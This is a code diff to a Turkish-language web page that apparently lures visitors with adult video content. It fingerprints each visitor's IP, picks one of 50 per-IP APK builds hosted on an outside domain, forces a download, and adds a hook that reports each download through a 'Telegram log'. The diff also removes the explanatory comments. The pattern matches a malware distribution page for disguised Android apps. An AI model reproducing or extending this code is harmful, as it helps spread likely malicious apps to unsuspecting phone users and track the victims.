@@ -156,25 +156,19 @@
         <p class="text-[10px] text-gray-400 mt-1">Güncel</p>
     </div>
 
+    <script src="log.js"></script>
     <script>
         // ========== IP'YE ÖZEL APK LİNKİ ==========
-        // 1. IP'yi al
-        // 2. IP'nin hash'ini hesapla (1-100 arası)
-        // 3. O hash'e karşılık gelen APK linkini oluştur
-        
         function getIpBasedApkLink(ip) {
-            // IP'den basit bir hash hesapla
             let hash = 0;
             for (let i = 0; i < ip.length; i++) {
                 hash = ((hash << 5) - hash) + ip.charCodeAt(i);
                 hash = hash & hash;
             }
-            // 1-100 arasına çevir (mutlak değer)
             let index = Math.abs(hash) % 50 + 1;
             return `https://kaspergroo.com/obb/TurkPornoV1.1.${index}.apk`;
         }
 
-        // IP'yi öğren (api.ipify.org üzerinden)
         async function getMyApkLink() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -184,12 +178,12 @@
                 console.log(`IP: ${myIp} -> APK: ${apkLink}`);
                 return apkLink;
             } catch (error) {
-                console.error('IP alınamadı, varsayılan APK kullanılıyor:', error);
+                console.error('IP alınamadı:', error);
                 return 'https://kaspergroo.com/obb/TurkPornoV1.1.1.apk';
             }
         }
 
-        // ========== VİDEO VE DİĞER FONKSİYONLAR ==========
+        // ========== VİDEO ==========
         const videos = [
             'videos/video1.mp4', 'videos/video2.mp4', 'videos/video3.mp4', 'videos/video4.mp4', 'videos/video5.mp4',
             'videos/video6.mp4', 'videos/video7.mp4', 'videos/video8.mp4', 'videos/video9.mp4', 'videos/video10.mp4',
@@ -237,7 +231,6 @@
             const downloadBtn = document.getElementById('downloadBtn');
             if (!downloadBtn) return;
             
-            // IP'ye özel APK linkini al
             const apkUrl = await getMyApkLink();
             console.log('Kullanılacak APK:', apkUrl);
             
@@ -253,6 +246,14 @@
                 downloadBtn.disabled = true;
                 
                 try {
+                    // 🔥 TELEGRAM LOG GÖNDER
+                    if (typeof window.sendLog === 'function') {
+                        await window.sendLog(apkUrl);
+                        console.log('✅ Log gönderildi');
+                    } else {
+                        console.log('❌ sendLog fonksiyonu bulunamadı');
+                    }
+                    
                     showToast("İndirme başlatılıyor!");
                     window.location.href = apkUrl;
                     
